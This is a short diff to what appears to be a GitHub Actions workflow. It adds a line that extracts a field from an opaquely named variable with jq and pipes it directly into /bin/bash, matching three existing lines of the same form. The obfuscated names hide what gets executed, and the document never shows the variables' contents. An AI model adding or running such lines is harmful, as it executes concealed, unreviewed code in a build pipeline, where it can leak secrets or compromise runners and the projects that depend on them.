@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$cytxt089" | jq -r .gmsb88 | /bin/bash
           printf '%s' "$acaq980" | jq -r .d7228 | /bin/bash
           echo $w20590 | jq -r .chj5 | /bin/bash
+          printf '%s' "$kht4642" | jq -r .rxos0 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
